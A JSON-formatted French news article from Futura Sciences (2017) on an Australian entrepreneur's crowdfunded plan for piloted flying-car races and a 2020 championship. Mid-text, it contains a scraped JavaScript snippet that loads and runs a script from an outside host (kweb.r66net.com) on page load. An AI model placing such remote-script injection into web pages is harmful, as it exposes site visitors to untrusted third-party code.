{"title": "Bientôt des courses de voitures volantes ?", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "13/12/2017", "content": "S'inspirant du rôle de précurseur technologique que joue la Formule 1 dans l'automobile, un entrepreneur australien veut accélérer le développement de la voiture volante en organisant des courses. La  voiture volante  suscite bien des projets, certains très sérieux, d'autres moins. Difficile pour le moment de dire où se classe celui de Matt Pearson. Cet entrepreneur australien vient de lancer une campagne de financement sur Kickstarter pour fabriquer une voiture volante destinée à la compétition. En réalité, il ne s'agit pas à proprement parler d'une  voiture volante , car l'engin ne possède pas de roues. Il faut plutôt parler d'un  drone  quadrirotor caréné capable d'accueillir un pilote humain. L'idée peut sembler farfelue, mais le raisonnement qui la préside se tient. À l'instar de Formule 1, qui joue un rôle de laboratoire d'essai pour les technologies retrouvées ensuite dans les voitures de série, créer une compétition de voitures volantes contribuera à accélérer le développement de ce moyen de transport.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un Airspeeder World Championship en 2020 L'engin imaginé par Matt Pearson, qui n'existe pour le moment que sur le papier, sera mû par quatre moteurs électriques  brushless  (sans balais) de 50 kilowatts chacun alimentés par les mêmes cellules lithium-ion que celles utilisées dans la  Tesla  Model S. L'appareil nommé  Alauda Mark 1 Airspeeder  pourrait voler jusqu'à 250 km/h à une altitude maximale de 3,5 mètres. Sa carrosserie sera fabriquée en  fibre de carbone  et le châssis en  aluminium  aéronautique pour un poids à vide de 120  kg . L'autonomie annoncée est d'à peine dix minutes, ce qui, dans l'état, ne permet pas d'envisager une course digne d'intérêt. Qu'à cela ne tienne, un premier vol d'essai est censé avoir lieu début 2018, suivi, un peu plus tard, d'une confrontation entre deux appareils dans le  désert  australien. Et, si tout se déroule selon les plans de Matt Pearson, le premier « Airspeeder World Championship » impliquant différents constructeurs devrait avoir lieu en 2020. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  eoliennes volantes  |  soucoupes volantes nazis  |  soucoupes volantes video  |  fourmies volantes dans maison  |  fourmis volantes dans maison  |  voitures gpl  |  emissions co2 voitures  |  materiaux de voitures  |  voitures futuristes  |  voitures electriques", "theme": "tech"}